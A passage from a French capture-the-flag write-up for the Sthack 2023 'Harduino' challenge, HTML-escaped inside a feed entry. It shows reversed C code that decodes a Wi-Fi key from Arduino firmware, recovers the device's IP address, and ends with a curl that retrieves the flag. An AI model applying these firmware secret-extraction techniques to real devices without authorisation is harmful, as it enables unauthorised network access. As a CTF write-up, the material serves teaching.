class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r1_8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len_cle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Une commande gcc plus tard nous récupérons la clé Wi-Fi.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./decode_cle 
+Z6a[[Pb&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;H?N+&amp;lt;c&amp;amp;-.qYA#?# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;récupération-du-flag&quot;&gt;Récupération du flag&lt;/h2&gt;
+
+&lt;p&gt;Alors nous ouvrons le gestionnaire de Wi-Fi mais sans trouver le SSID MyAccessPoint. Est-il caché ? Eh bien non, il suffisait juste de se balader dans la mairie pour le trouver. Une fois a porté nous pouvons nous connecter. Reste-t-il à savoir que faire une fois connecté.&lt;/p&gt;
+
+&lt;p&gt;En analysant la suite du code on peut retrouver une réponse HTTP:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/sthack2023/harduino/http.png&quot; alt=&quot;http&quot; class=&quot;img-responsive smallpict&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il nous faut donc trouver l’adresse IP de l’Arduino sur le réseau. Pour cela on peut revenir dans la fonction setup et chercher la méthode associée.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;arduino&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On y retrouve l’adresse suivante une fois décodée : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.4.42&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Un curl et le flag est à nous&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl 192.168.4.42
+Welcome to the flag provider 
+The flag is: STHACK&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;H@rdU1n0_107_MuCh_FuN&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bingo :sparkles:&lt;/p&gt;</content><author><name></name></author><category term="Sthack-2023" /><summary type="html">Harduino writeup</summary></entry></feed>
